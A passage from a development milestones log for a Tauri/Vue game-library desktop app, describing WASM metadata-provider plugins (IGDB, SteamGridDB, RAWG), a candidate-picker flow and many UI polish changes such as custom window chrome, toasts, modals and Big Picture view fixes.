  - **Metadata WASM support didn't exist at all.** Added a third independent `bindgen!` world, `metadata-plugin-world` (`interface metadata-plugin { record metadata-result {...}; fetch-metadata: func(title) -> result<option<metadata-result>, string>; }`), a third `Host` impl block in `wasm_plugins.rs`, and `wasm_plugin_runtime.rs` gained `instantiate_metadata`/`instantiate_metadata_from_paths` + a new `wasm_plugin_fetch_metadata` Tauri command mirroring the source/wrapper pattern exactly. `loader.ts` gained `createWasmMetadataProviderPlugin`, and `"metadata"` was added to `WASM_SUPPORTED_KINDS` and `plugin_installer.rs`'s `SUPPORTED_WASM_KINDS`/`detect_kind` so metadata-kind manifests install by URL through the same universal flow as source plugins
  - **No way for a WASM plugin to collect user config.** TS plugins solve this with a `settingsComponent` (e.g. IGDB's own form); WASM plugins had nothing equivalent. Rather than build one-off UI per plugin, `plugin.json` gained an optional `settingsSchema: {key, label, type}[]` (`WasmPluginManifest` on the Rust side, `#[serde(default)]` since most plugins - Steam/GOG/Epic/LR/LE - don't need it), and a new generic `WasmPluginSettingsForm.vue` renders whatever fields a plugin declares, writing to the same `plugin:<id>:<key>`-namespaced `settings` rows the WASM guest already reads via `settings-get` - the frontend writes those rows directly (bypassing WASM entirely, since it's just a key-value read/write), so a plugin reads back whatever got saved with zero extra wiring
  - `MetadataResult` (TS) and IGDB metadata previously only carried description/releaseDate/genres - extended with optional `coverArtUrl`/`backgroundArtUrl` so SteamGridDB (art-only) and IGDB (text-only) can both be ordinary `MetadataProviderPlugin`s merged the same way by `metadataProviders.fetchMetadata` (first-non-null-wins per field, already-established policy, just extended to two more fields)
  - `sgdb-metadata-wasm-plugin`/`igdb-metadata-wasm-plugin`: new separate repos, same shape as the source-plugin ports. Verified for real in stages - first the no-API-key error path (staged the real compiled `.wasm`, instantiated it against the actual `metadata-plugin-world` runtime via a temp test, confirmed the `settings-get`/error-propagation plumbing works end to end), then against real live credentials (a real SteamGridDB key, real Twitch client id/secret) fetching real cover art and real IGDB metadata
  - GameCard's dedicated "Fetch Cover Art" button (and `GameListRow`'s, and `BrickBlockGameCard`'s) removed once `fetchMetadata` started returning art fields too - one button now covers both text and image metadata, matching how multi-provider merging already worked for text. `library.ts`'s `fetchCoverArt`/`fetchingCoverFor` deleted as dead code once nothing called them
  - Built-in `sgdb.rs`/`igdb.rs`/`src/plugins/igdb/` retired once both WASM versions were confirmed working for real - `EditGameModal`'s dedicated background-art-only "Fetch" button was repointed to go through `metadataProviders.fetchMetadata` (extracting just `backgroundArtUrl`) instead of the old SteamGridDB-specific command, rather than being removed, since it's a genuinely different, still-useful UX (refresh background art without leaving the edit modal). The old built-in `SteamGridDbSettings.vue` (inline SGDB key field) and `library.ts`'s `sgdbApiKey`/`saveApiKeys`/`SGDB_API_KEY_SETTING` were deleted entirely - superseded by the new plugin's own `settingsSchema`-driven form. `metadataProviders.ts`'s `DEFAULT_PROVIDER_IDS` (previously `["igdb"]`, the built-in TS plugin) reset to empty - neither provider is bundled at build time anymore, both are runtime-installed WASM plugins with no guaranteed-present default the way the old built-in was

(Locale Remulator/Locale Emulator's WASM migration moved into Milestone 10, to run alongside their managed-install work instead of as a separate later pass.)

## Milestone 14 — UI Polish (Continuous, ongoing)
Current UI was a single flat top-to-bottom stack (settings panels, forms, and grid all visible on one scrolling page) using the OS's default title bar and largely unstyled form controls - read as a webpage, not a desktop app. This milestone reworks visual structure/chrome for both Desktop UI and Big Picture without changing underlying functionality. This milestone doesn't close - UI polish is open-ended by nature; new items get appended in place in milestones.md. Originally numbered Milestone 9, sequenced between the WASM-adoption milestone (then 8.5, since renumbered to 9) and the LR/LE managed-install milestone (10); renumbered 14.5 once 1.0.0 shipped, since an ongoing, never-closing milestone doesn't belong inside the closed core roadmap's numbering.

- Custom window chrome — `decorations: false` in `tauri.conf.json`, `TitleBar.vue` replaces the default OS title bar
  - Drag region via `data-tauri-drag-region`; minimize/maximize-restore/close via `getCurrentWindow()`. Maximize icon toggles based on `isMaximized()`, refreshed via `onResized`
  - Rendered in `App.vue` only when `!bigPicture` - Big Picture's own fullscreen mode has no window chrome to replace, and OS-level edge-resize still works (only the drawn chrome was removed, not resizing)
  - Needed new `core:window:allow-minimize`/`allow-toggle-maximize`/`allow-close`/`allow-is-maximized`/`allow-start-dragging` capabilities - the drag region's internal `start_dragging` invoke is gated by its own separate permission from minimize/maximize/close, missed on the first pass (buttons worked, dragging silently didn't, until `allow-start-dragging` was added)
  - Icons via `@tabler/icons-vue` (MIT, tree-shakeable per-icon components, no CSS/theming opinions bundled in - doesn't fight the hand-rolled CSS-variable theme system the way a full component library would've) rather than unicode glyphs, for the titlebar controls and the sidebar's gamepad-connected badge
  - Verified in a running app: dragging, minimize, maximize/restore, and close all work correctly; icons render and are sized/aligned well
- Navigation shell — `NavSidebar.vue` splits Library (`AddGameForm`/`GameFilters`/`GameGrid`or`GameList`) and Settings (`AppSettings`/`SteamGridDbSettings`/`PluginSettings`) into separate views, toggled via `activeView` in `App.vue` rather than always-visible-stacked. `ErrorBanner` and `EditGameModal` stayed outside the view switch. Gamepad badge + Big Picture button moved into the sidebar itself. Layout is a fixed-height flex column (`TitleBar` + flex `app-shell`) with only `.content` scrolling internally. Needed a global `html`/`body`/`#app` margin reset in `App.vue` - the browser's default `body` margin was creating an outer page scrollbar around the fixed-height layout. Verified in a running app
- Grid/list view toggle redesigned as a single icon button (`IconLayoutGrid`/`IconList` from `@tabler/icons-vue`) next to the search bar in `GameFilters.vue`, replacing the old two-button toggle that lived separately in `App.vue`. Icon shown is the mode a click would switch *to* (shows the list icon while in grid mode, and vice versa)
- Collapsible sidebar — button on the left of `TitleBar` (`IconLayoutSidebarLeftCollapse`/`IconLayoutSidebarLeftExpand` from `@tabler/icons-vue`) toggles `sidebarCollapsed` in `App.vue`, which conditionally renders `NavSidebar` (`v-if`)
  - Slide animation — `<Transition name="sidebar">` wraps `NavSidebar` in `App.vue`; `.sidebar-enter-active`/`-leave-active` transition `width`/`padding`/`opacity` together (defined in `NavSidebar.vue`'s own scoped style, since transition-generated classes apply to the component's root element). `.sidebar` needed `overflow: hidden` added so its content doesn't spill out while shrinking. An icon-only collapsed rail (vs. fully hidden) would be a further refinement, not done
- Themed scrollbars for desktop mode — global `scrollbar-width`/`scrollbar-color` (Firefox) + `::-webkit-scrollbar`/`-track`/`-thumb` (Chromium/WebView2, what Tauri uses on Windows) rules in `App.vue` using the Catppuccin variables (`--color-surface1` thumb, `--color-base` track, `--color-accent` on hover) instead of the OS-default scrollbar. Big Picture's existing scoped scrollbar-hiding rules in `BigPictureGrid.vue` still win there on selector specificity, so this only affects desktop mode as intended
- Further sidebar/titlebar rework: `AddGameForm.vue` converted from an always-visible inline form into a modal (`open`/`close` prop-emit, same backdrop pattern as `EditGameModal`), triggered by an "Add Game" button (`IconPlus`) in the sidebar rather than sitting permanently in the Library view's content. Removed the "Game Library" brand text from `NavSidebar` (redundant with `TitleBar`'s own title). Moved the "Big Picture Mode" button out of the sidebar into `TitleBar`, next to the sidebar-collapse button, as an icon-only button (`IconDeviceTv`) instead of a text button
- Design token pass — spacing (`--space-1..6`), border-radius (`--radius-sm/md/lg`), and shadow (`--shadow-sm/md/lg`) scales added to `App.vue`'s `:root` alongside the existing Catppuccin color variables, plus a `box-sizing: border-box` reset. Global base styles for raw `button`/`input`/`textarea`/`select` (checkbox/radio explicitly excluded from the input styling so native rendering is preserved) give every desktop component a consistent look for free - confirmed by reading through `GameCard`/`GameListRow`/`PluginSettings`/`SteamGridDbSettings`/`AddGameForm`/`EditGameModal` first that none of them had any button/input appearance styling of their own beyond layout, only relying on unstyled browser UA chrome, so the global base applies cleanly everywhere with no conflicts. `button[type="submit"]` gets accent-colored primary styling, distinguishing primary actions (Save/Add) from secondary `type="button"` ones (Cancel) automatically. `TitleBar.vue`'s `.titlebar-button` needed explicit `padding: 0; border-radius: 0;` overrides, since its fixed 46px-square icon-button layout would've broken under the new global button padding/radius - the only component that needed a conflict fix
- `GameCard`/`GameListRow`'s Play/Edit/Remove buttons switched from text labels to icon-only (`IconPlayerPlay`/`IconEdit`/`IconTrash` from `@tabler/icons-vue`), with `title` attributes preserving an accessible/hover label. "Fetch Cover Art"/"Fetch Metadata" buttons kept as text, not in scope for this change
- `GameCard` hover redesign — default view is cover-art-only (title/description/release-date/playtime text removed from the always-visible card, per explicit choice over keeping title always visible); all 5 action buttons moved into a `.footer` bar that slides up from the bottom on hover (`translateY(100%)` → `translateY(0)`); card scales up slightly on hover (`transform: scale(1.06)`); a tooltip-style `.balloon` (title + playtime, small triangle pointer) fades in above the card on hover. Judgment call made during implementation: also converted "Fetch Cover Art"/"Fetch Metadata" to icon-only (`IconPhoto`/`IconInfoCircle`) here, since 5 buttons including two long text labels don't fit in a compact slide-up footer over a ~140-200px card - flagged to the user rather than silently changing scope. `GameListRow` (list view) untouched - this hover treatment is specific to the grid card
  - Fix: balloon needs to flip below the card when the card's top edge is scrolled out of view (no room to show it above). Balloon is teleported to `<body>` (`<Teleport to="body">`) and positioned `fixed` from the card's own `getBoundingClientRect()` computed on `mouseenter`; `placement` is `"below"` when `rect.top < 60px`, else `"above"` - `.balloon-above`/`.balloon-below` swap both the `transform` offset and the pointer-triangle's edge (pointing down vs. up) so the arrow always points back at the card
- Toast/notification system replacing the plain-text `ErrorBanner` for errors and confirmations (e.g. "scan complete: 3 added, 1 merged")
  - New `useToastStore` — bottom-right stack, auto-dismiss after 5s, click-to-dismiss, `TransitionGroup` fade+slide, `error`/`success`/`info` variants
  - `library.ts`'s `error` ref removed entirely - every `error.value = ...` call site (`fetchMetadata`/`fetchCoverArt`/`fetchBackgroundArt`/`addGame`/`launchGame`) now pushes an error toast instead
  - `plugins.ts`'s `lastScanSummary` (previously shown inline in `PluginSettings`, only visible while on that settings tab) removed the same way - scan completion pushes a success toast, scan failure/no-plugins-enabled push error toasts, visible regardless of which view is active
  - `ErrorBanner.vue` deleted; `ToastContainer` mounted once at the top level of `App.vue` (outside both the desktop and Big Picture branches) so toasts surface in either mode
  - Modal-local validation errors (`AddGameForm`/`EditGameModal`'s "Title and executable path are required") deliberately left as inline `<p>` text, not toasted - field-validation errors read better next to the field than in a corner-anchored notification
- Empty/loading states — placeholder for an empty library, skeleton loaders for grid/list while a scan or metadata fetch is in flight
  - `SkeletonCard.vue`/`SkeletonRow.vue` (shimmer animation via a moving gradient) render in `GameGrid`/`GameList` while `plugins.scanning` is true
  - Empty state distinguishes a genuinely empty library (`library.games.length === 0`: `IconInboxOff` + "Add a game or scan a source plugin to get started") from filters/search excluding everything ("No games match your search/filters") - previously both cases showed the same generic text
  - Per-card fetch-in-progress indicator added to `GameCard` (`IconLoader2` + CSS `spin` animation, overlaid on the cover) - needed once "Fetch Cover Art"/"Fetch Metadata" became icon-only buttons with no text to show a "Fetching..." state; `GameListRow` already shows textual `"..."` during fetch so was left as-is
- Modal polish — `EditGameModal` transition/animation, focus trap, click-outside/Escape-to-close consistency
  - New shared `BaseModal.vue` (backdrop, `<Transition name="modal">` fade+scale, focus trap, Escape-to-close, click-outside via existing `@click.self`) extracted rather than duplicating this logic across modals - two real instances (`EditGameModal`, `AddGameForm`) justified the extraction. Takes `open`/`max-width` props and a `close` emit; parent still owns its own visibility state
  - Focus trap: on open, focuses the first focusable element inside the modal and cycles Tab/Shift+Tab within it (queries `a[href], button, textarea, input, select, [tabindex]`, excluding disabled ones)
  - `EditGameModal`/`AddGameForm` each kept their own `v-if="library.editingGame"`-style narrowing inside the slot content (redundant with `BaseModal`'s internal `v-if="open"` at runtime, but needed so `vue-tsc` can still narrow `library.editingGame` from nullable across the component boundary)
  - Box styling (background/padding/border-radius/width/max-height) moved from each modal's own `.modal` class into `BaseModal`'s `.modal-frame` (now the single owner of modal chrome); each modal's remaining scoped styles renamed `.modal` → `.modal-body`
- Big Picture visual pass — apply the same design tokens, add tile focus/selection transitions consistent with the new desktop chrome
  - `BigPictureTile.vue` now uses `--radius-lg`/`--radius-md` instead of hardcoded `12px`/`10px`, and gains a `--shadow-lg` glow on the focused tile (console-style "lifted" highlight) alongside the existing accent border/scale; transition timing aligned to `0.15s ease` matching `GameCard`'s hover transition
  - `BigPictureGrid.vue`'s tile gap uses `--space-6` instead of a hardcoded `2rem`; empty-library state now matches the desktop empty state's pattern (`IconInboxOff` + message, was plain text)
  - Big Picture's dark, theme-independent background/text colors (`#111`/`#fff`/`#444`) deliberately left as literals, not converted to Catppuccin CSS variables - the console aesthetic is intentionally fixed-dark regardless of the active light/dark theme, an existing decision from earlier in the project. Same reasoning for `.big-picture`'s `3rem` outer padding, which doesn't cleanly map onto the `--space-*` scale
- Big Picture slideshow view — new selectable view mode alongside the existing tile grid (toggle, like desktop's grid/list). Full-bleed background art of the selected game as backdrop, cover-art strip pinned to the bottom with the selected cover centered and 3 neighbors visible on each side (7 visible at once), gamepad/keyboard nav shifts the centered selection left/right through the library
  - New `BigPictureSlideshow.vue`, toggled against the existing `BigPictureGrid.vue` via `bigPictureViewMode` in `App.vue` (`IconSlideshow`/`IconLayoutGrid` button next to Exit, mirrors the desktop grid/list toggle's "icon shows the mode you'd switch to" convention) - not persisted across Big Picture sessions, unlike desktop's `viewMode` which is
  - 1D linear nav reuses `useGamepadNav` rather than hand-rolling equivalent logic - passing `columns: () => library.games.length` makes its movement math degenerate into a plain left/right list (up/down never trigger since `columns` is always ≥ the current index)
  - Cover strip renders ±3 neighbors around the centered index with distance-based `scale`/`opacity` falloff (coverflow-style), centered cover gets an accent border + `--shadow-lg` glow; clicking a non-centered cover re-centers on it, clicking the centered one launches
  - Fix: near the first/last game, the strip has fewer real neighbors on one side, and `justify-content: center` was centering that shorter row instead of the selected cover - fixed by always rendering exactly 7 slots (offsets -3..3) and filling out-of-range ones with an inert `.strip-cover-dummy` placeholder (`visibility: hidden`, `pointer-events: none`, same box size) instead of omitting them
  - Reuses the same backdrop crossfade pattern as `BigPictureGrid` (`<Transition name="backdrop-fade">` keyed on the background art URL) and the same dark, theme-independent console colors
  - No theme-slot integration for this view (no `useThemeSlot` call) - the milestone item didn't call for theme-plugin overrides of the new slideshow, and `BigPictureGrid`'s existing `BigPictureTile` slot is unaffected/untouched

### Backlog
- Metadata provider `metadata-plugin` WIT interface redesigned around a two-step search/fetch split, replacing the single `fetch-metadata(title)` export - grew directly out of the Milestone 11 RAWG bug (wrong-game match), where the user's own proposed fix ("if more than one matches the exact same name, show me candidates to choose; if none, leave blank") needed real plugin-to-host infrastructure, not just a smarter default inside one plugin
  - New `metadata-candidate` record (`id`, `label`) plus `search-candidates(title) -> list<metadata-candidate>` and `fetch-metadata-by-id(id) -> option<metadata-result>`, replacing `fetch-metadata(title)` entirely in `wit/plugin.wit` across the host and all three existing metadata plugin repos (IGDB/SteamGridDB/RAWG) - a breaking WIT change, so all three bumped `0.1.x` → `0.2.0` (pre-1.0, so a WIT/manifest-breaking change bumps minor rather than major per the project's own versioning convention)
  - Host side: `wasm_plugin_runtime.rs`'s `wasm_plugin_fetch_metadata` command split into `wasm_plugin_search_candidates`/`wasm_plugin_fetch_metadata_by_id`, new `WasmMetadataCandidate` DTO. No `host` interface changes needed - only the plugin-exported `metadata-plugin` interface changed, so `wasm_plugins.rs`'s `Host` trait impls were untouched
  - `MetadataProviderPlugin` (TS): `fetchMetadata(title)` replaced with `searchCandidates(title)`/`fetchMetadataById(id)`, mirroring the WIT split; new `MetadataCandidate` type. `loader.ts`'s `createWasmMetadataProviderPlugin` updated to call the two new Tauri commands
  - Revised after first real use: rather than pausing once per ambiguous provider (a separate modal each time), `fetchMetadata` now runs in two explicit phases. Phase 1 calls `searchCandidates` on every enabled provider up front and toasts each provider's own outcome as it lands (`"IGDB: found a match."` / `"SteamGridDB: no match found."` / `"RAWG: 2 matches found."` / a `search failed` error toast if the call throws) - visibility into what's happening per-provider was missing before and the user asked for it directly. Providers with 0 or 1 candidates resolve immediately, no interruption. Phase 2, only if at least one provider came back with 2+ candidates, shows exactly ONE combined `CandidatePicker.vue` with one section per ambiguous provider rather than one modal per provider - `chooseCandidate`/`skipCandidatePrompt` collapsed into a single `submitCandidateSelections(selections: Record<pluginId, id|null>)` call. `chosenIds` stays index-aligned with `loadedPlugins` across both phases specifically so a late-resolved ambiguous provider still merges at its original priority position (not appended after every already-resolved provider) - first-non-null-wins merge order has to survive the pause for user input
  - New `metadata-candidate.image-url: option<string>` (WIT) / `MetadataCandidate.imageUrl?: string` (TS) - the picker shows a thumbnail per candidate when a provider has one, since a bare title string doesn't disambiguate as well as a cover image does. **IGDB** search-candidates now requests `cover.image_id` too, building the thumbnail URL from IGDB's documented `t_thumb` CDN pattern (confirmed the field exists via a real authenticated API call). **RAWG** search-candidates passes through the search response's existing `background_image` field (was already there, just wasn't being read). **SteamGridDB** leaves it unset - confirmed via a real API call that its autocomplete endpoint returns only `id`/`name`/`verified`/`types`/`release_date`, no image; that section just renders as plain text rows
  - `CandidatePicker.vue`: click a candidate row to select it (highlighted via `--color-accent`, click again to deselect - at most one selection per section), footer has one "Continue" button that submits every section's selection (or lack of one, meaning "skip this provider") at once
  - Real testing surfaced two more asks. First, "how does this decide between IGDB and RAWG when both answer" - answered directly rather than changing anything: it's `enabledIds`'s provider-priority order (the reorder UI from the earlier backlog entry), first-non-null-wins per field, nothing automatic beyond that. Second, exact-name-only filtering (RAWG's own fix from the Milestone 11 bug) was IGDB/SGDB-only missing - both still returned raw top-5 relevance/autocomplete results unfiltered, so they popped the picker far more than genuinely necessary. Applied the same `.eq_ignore_ascii_case` filter to both: IGDB's search query widened to `limit 10` (was 5, since filtering can now legitimately drop matches) then filtered by exact `name`; SGDB's `take(5)` cap replaced outright with the same filter (no result-count cap needed once filtered - SteamGridDB's autocomplete already returns a small result set)
  - Followed by "add the same preview-image feature to SGDB too" - unlike IGDB/RAWG, SteamGridDB's autocomplete response genuinely has no image field to just read (confirmed earlier), so `search_candidates` now does one extra `fetch_first_image(&auth, "grids", id)` lookup per candidate after the exact-match filter, reusing the same grids-image helper `fetch_metadata_by_id` already had. Only after filtering, not per raw autocomplete result, keeps the extra-calls cost to a handful at most; a candidate whose image lookup fails or comes up empty (`.ok().flatten()`) still gets listed without a thumbnail rather than being dropped - a missing preview image isn't a reason to hide an otherwise-valid candidate
  - Each plugin's search/fetch split, briefly: **IGDB** - `search-candidates` runs the existing Apicalypse `search` query for `name,cover.image_id` (was `summary,first_release_date,genres.name; limit 1`), `fetch-metadata-by-id` runs a `where id = {id}` query for the full text fields; each call re-authenticates against Twitch since a WASM instance is stateless/per-call, no token cache available. **SteamGridDB** - `search-candidates` now also reads the autocomplete response's `name` field (previously only `id`), `fetch-metadata-by-id` is the original grids/heroes image lookup unchanged, just keyed off a passed-in id instead of a freshly-searched one. **RAWG** - `search-candidates` filters results down to only exact case-insensitive `name` matches (per the user's explicit ask - a non-exact match never becomes a candidate at all, not even a fallback), and appends the release year to `label` when needed, since two RAWG listings can share the literal same name (a real possibility for remasters/reissues) and the picker needs *something* to tell them apart; `fetch-metadata-by-id` collapsed to one detail-endpoint call (confirmed for real that `/api/games/{id}` alone has `description_raw`/`released`/`genres`, no separate search-result stashing needed)
- Brick Block theme's pixel font swapped from Galmuri11 (CDN, `cdn.jsdelivr.net`) to a bundled local font - the CDN `<link>` triggered a WebView2 "Tracking Prevention blocked access to storage" console warning on every launch (benign - the font itself still loaded, only its HTTP cache entry got dropped - but a real dependency on network access at app launch for a theme's font was worth removing anyway). Replaced with [Fusion Pixel Font](https://github.com/TakWolf/fusion-pixel-font)'s 12px proportional Korean build (`fusion-pixel-12px-proportional-ko.otf.woff2`, OFL 1.1) - verified via a real `fontTools` cmap inspection (not assumed from the repo's own ambiguous docs) that the `ko`-suffixed file already covers basic Latin/ASCII on its own (36,518 mapped glyphs total), so no separate Latin file + `unicode-range` split was needed, just the one file. Bundled under `src/plugins/brick-block-theme/` and imported via Vite's `?url` suffix so it gets fingerprinted/hashed into the build like any other asset; `injectFont()`/`removeFont()` now inject/remove a `<style>` with a `@font-face` block (using the font's real internal family name, `Fusion Pixel 12px Prop ko`, confirmed via the same `fontTools` inspection) instead of a `<link>` to an external stylesheet. `FUSION-PIXEL-OFL.txt` (the font's own OFL license) copied in alongside for compliance
- API-key/settings forms moved from inline-under-the-plugin-row into a modal, and GameCard's dedicated "Fetch Cover Art" button folded into the unified "Fetch Metadata" flow - both grew out of the SGDB/IGDB WASM plugin work (Milestone 9), not scheduled UI polish on their own
  - IGDB's own form, the new generic `WasmPluginSettingsForm.vue` (WASM plugins' declared `settingsSchema`), and the old built-in `SteamGridDbSettings.vue` all sat permanently visible inline before this - a new `SettingsFormModal.vue` (later renamed, see below) wrapped each behind a "Settings" trigger button instead. `InstallableStatus.vue`'s Install/Uninstall toggle deliberately stayed inline - hiding an at-a-glance status behind a click would be a regression, not requested
  - GameCard/BrickBlockGameCard/GameListRow's separate cover-art button removed once `metadataProviders.fetchMetadata`'s merge started returning `coverArtUrl`/`backgroundArtUrl` too (any enabled provider can contribute either field, first-non-null-wins, same as description/releaseDate) - `library.ts`'s `fetchCoverArt`/`fetchingCoverFor` deleted as genuinely dead code once nothing called them. `EditGameModal`'s separate background-art-only "Fetch" button (still calling the old built-in `sgdb.rs` path directly) was left untouched - different UI surface, not part of what was agreed to change
  - Consolidated further on request: all modal-form components (`AddPluginModal`/`ConfirmInstallModal`/`SettingsFormModal`/`EditGameModal`, plus `AddGameForm.vue` which had never been migrated and still hand-rolled the same `<h2>`+layout pattern) moved under `src/components/desktop/modalForms/`. Introduced a `Modal.vue` wrapper (`BaseModal` + title/layout chrome) to kill the duplication first, then - once every single consumer turned out to want that chrome, meaning the two-layer split had exactly one real caller - merged `Modal.vue`'s title prop directly into `BaseModal.vue` and deleted `Modal.vue`, per the user's own read that keeping two layers for one caller was overhead rather than earned separation. Files renamed to drop the now-redundant "Modal"/"Form" suffix once inside a folder already named `modalForms` (`AddPluginModal.vue` → `AddPlugin.vue`, `ConfirmInstallModal.vue` → `ConfirmInstall.vue`, `SettingsFormModal.vue` → `SettingsButton.vue`, `EditGameModal.vue` → `EditGame.vue`, `AddGameForm.vue` → `AddGame.vue`)
  - `WasmPluginSettingsForm.vue` later folded directly into `SettingsButton.vue` too, once the built-in IGDB retirement (see the SGDB/IGDB WASM migration entry above) removed `igdb/index.ts`, its only other consumer with different slotted content - checked via `grep -rln "SettingsButton" src/` before merging, confirming `loader.ts`'s `attachSettingsSchemaForm` was the sole real caller and it always paired `SettingsButton` with this exact form. Same one-real-caller reasoning as the `Modal.vue`/`BaseModal.vue` merge above. `SettingsButton` now owns the schema-driven field rendering and settings-repo load/save directly (`title`/`pluginId`/`schema` props) instead of slotting a separate fields-only component wired through an exposed-`save()` ref
- Priority/reorder UI for source and metadata-provider plugins, prompted by a real gap found while explaining how `metadataProviders.fetchMetadata`'s merge order worked: enable/disable order had never actually controlled fetch/scan sequence - `loadEnabledPlugins` (`loader.ts`) filtered `getAvailablePluginManifests`'s own discovery order by membership in `enabledIds`, so toggling a plugin off and back on (or installing a new one later) silently reshuffled priority with no user control at all
  - `plugins.ts`/`metadataProviders.ts`'s `enabledIds` changed from `Set<string>` to an ordered `string[]` (membership via `indexOf`/`includes` instead of `.has`/`.add`/`.delete`); persisted format unchanged (still a JSON array in the `settings` table). New `movePlugin`/`moveProvider(id, direction)` actions splice-and-reinsert. `wrapperPlugins.ts` deliberately left on `Set` - no merge-priority semantics there (a game picks one wrapper explicitly, not a first-wins scan)
  - `loadEnabledPlugins` now takes `Iterable<string>` and iterates the caller's own order directly (building an id→manifest map first) instead of filtering manifest-discovery order - this is what actually made the stored order meaningful; a `Set` (wrapper's case) still works since Sets iterate in insertion order too, just with no reorder UI hanging off it
  - `PluginSettings.vue`: new `orderByPriority()` helper renders enabled plugins first in priority order, disabled/uninstalled ones after, with ↑/↓ buttons (disabled at the ends of the enabled range) next to each enabled row. Added a one-line hint above each of the Source/Metadata Provider tabs explaining what the order actually controls (last-plugin-wins on a source scan title collision; first-provider-with-an-answer-wins per metadata field) - the mechanism is genuinely non-obvious without that context, confirmed by the fact this whole feature came out of the user asking exactly that question
  - Fix: the ↑/↓ buttons and a row's optional `settingsComponent` (e.g. `SettingsButton`) were separate flex children on `.plugin-row`, so a row's controls landed in different horizontal positions depending on which of the two were actually present - wrapped both in one `.row-controls span` (`margin-left: auto`, fixed child order) so the control cluster always sits flush right regardless of which pieces exist for that row. Applied to both the Source and Metadata Provider tabs (same underlying markup shape)
  - Fix: loading plugin instances into `PluginSettings.vue`'s five `allXPlugins` maps via `ref()` triggered a real Vue warning ("Vue received a Component that was made a reactive object") - `ref()` deep-reactivizes Map values, including each plugin's `settingsComponent` (a live component definition), and handing a reactive-wrapped component to `<component :is="...">` is exactly what that warning flags. Switched all five to `shallowRef` - they're only ever swapped wholesale in `onMounted`, never mutated field-by-field, so no deep reactivity was ever needed
- Big Picture tile title hidden by default, reveals on hover/selection. First pass used a plain `opacity: 0`/`1` toggle on `.tile-title`, which left the parent `.tile`'s flex `gap` (and the title's own line-height) still reserving layout space below every tile at all times - not what was asked. User corrected: normal tiles should show cover/placeholder *only*, with the title appearing below the tile on hover/selection, not just fading in place. Reworked to collapse the title's box to zero instead of just its opacity: removed `.tile`'s `gap` entirely (moved that spacing onto the title's own `margin-top`), and `.tile-title` now sits at `max-height: 0; margin-top: 0; opacity: 0; overflow: hidden`, animating open to `max-height: 3rem; margin-top: var(--space-3); opacity: 1` on `.tile:hover`/`.tile.bp-cover-focused` (the latter reusing the existing class already bound to the `focused` prop, so keyboard/gamepad selection reveals the title the same way mouse hover does). `bun run build`/`cargo check` both clean.
  - **Second correction, from actually seeing it run:** growing `.tile-title` in flow (even from zero) still grew that one tile's own box on hover, which in a CSS grid stretches every other tile sharing its row to match - visible row-height jumps whenever any tile in a row was hovered. User's actual ask: don't expand the tile at all - shift the whole tile upward a little and reveal the title *outside* it. That also collided with `.bp-cover-frame`'s `overflow: hidden` (added earlier this milestone specifically so AST-rendered cover content clips correctly) - a title positioned outside the frame's own box would get clipped by that same `overflow: hidden` if it stayed the frame's own child. Restructured `BigPictureTile.vue`'s template to split the concern: a new inner `.tile-frame` div (carrying `bp-cover-frame`/`bp-cover-focused`, i.e. the clipping/border/scale-up) wraps just the cover/placeholder content, while the outer `<button class="tile">` (unclipped, `position: relative`) holds `.tile-frame` and `.tile-title` as siblings. `.tile-title` is now `position: absolute; top: 100%` - out of flow entirely, so it never affects this tile's own layout height or any sibling's grid row. Reveal is now a `transform: translateY(-0.6rem)` on the whole `.tile` (lifting frame+title together as one rigid unit, driven by `:hover`/a new `.tile-selected` class since `bp-cover-focused` moved to the inner frame) plus a plain opacity fade on the title itself - the frame's own `scale(1.05)` focus-zoom stayed on `.tile-frame` specifically, unchanged. Verified via compiled CSS: `.tile[data-v-*]` carries `position:relative` and the lift transition, `.tile-frame[data-v-*]` keeps its own transform/border-color/box-shadow transition, `.tile-title[data-v-*]` compiles with `position:absolute;top:100%`. `bun run build`/`cargo check` both clean.
- Long titles ellipsis instead of bleeding into neighbors. Since `.tile-title` is absolutely positioned (out of flow), a title longer than the tile's own column width was never clipped or wrapped by anything - it just overflowed visually across whatever sat next to it. Added `white-space: nowrap; overflow: hidden; text-overflow: ellipsis` directly to `.tile-title`. Verified via compiled CSS.
- **Fixed keyboard/gamepad focus fighting the mouse cursor.** `BigPictureGrid.vue`'s `@hover="focusedIndex = index"` trusted every `mouseenter` DOM event as a real hover - but a `mouseenter` also fires whenever the *element itself* moves under a stationary cursor (exactly what the tile's own focus-lift `translateY` does, plus the grid's `scrollIntoView` smooth-scroll), not only when the cursor physically moves. Net effect: navigating with a keyboard or gamepad could silently snap focus back to whatever tile the (unmoved) mouse cursor happened to be sitting over the instant the layout shifted underneath it - a real fight between two input methods, not a hypothetical.
  - Fix: added `src/composables/useMouseActivity.ts`, a module-level singleton `mouseActive` ref updated `true` only by a real `window` `mousemove` listener (this event genuinely never fires from an element moving under a stationary cursor, unlike `mouseenter`/`mouseleave`), plus a `suppressMouseActivity()` setter.
  - `useGamepadNav.ts`'s `move()` and `BigPictureGrid.vue`'s own `onKeydown` arrow-key branches both call `suppressMouseActivity()` immediately before mutating `focusedIndex` - marking the mouse "not really moving" until a genuine `mousemove` proves otherwise. The grid's hover handler (renamed `onTileHover`) now checks `mouseActive.value` before honoring a `mouseenter`-driven focus change, so a phantom `mouseenter` fired right after a keyboard/gamepad move is ignored, while real mouse movement (which always fires `mousemove` first) clears the flag and hover works normally again.
  - Kept as a module-level singleton rather than component state or a prop - there's exactly one physical mouse and one active Big Picture view, so this avoids threading the flag through `BigPictureGrid.vue` → `useGamepadNav` as an option/callback for no real benefit. `BigPictureSlideshow.vue` doesn't need the same fix - its own focus changes are driven by `@click`, not hover, so no such ambiguity exists there.
  - `bun run build`/`cargo check` both clean.
- Moved the desktop library's scrollbar off `App.vue`'s `.content` shell onto `GameGrid.vue`/`GameList.vue` themselves, per user request - the scrollbar previously sat at the edge of the whole content area (GameFilters included), rather than next to the game list/grid it actually scrolls.
  - `.content` stopped being the scroll container: `overflow-y: auto` replaced with `display: flex; flex-direction: column; overflow: hidden`, and its bottom padding dropped (moved into whichever child now owns the scroll, so it stays visible below the last row instead of sitting outside the scrollable area as dead space).
  - `GameGrid.vue`'s `.grid` and `GameList.vue`'s `.list` each gained `flex: 1; min-height: 0; overflow-y: auto; padding-bottom: var(--space-5)` - sized to whatever space is left below `GameFilters.vue` within `.content`'s flex column, each scrolling independently.
  - `GameFilters.vue`'s `.filters` gained `flex-shrink: 0` so it keeps its natural height as a flex sibling rather than getting compressed.
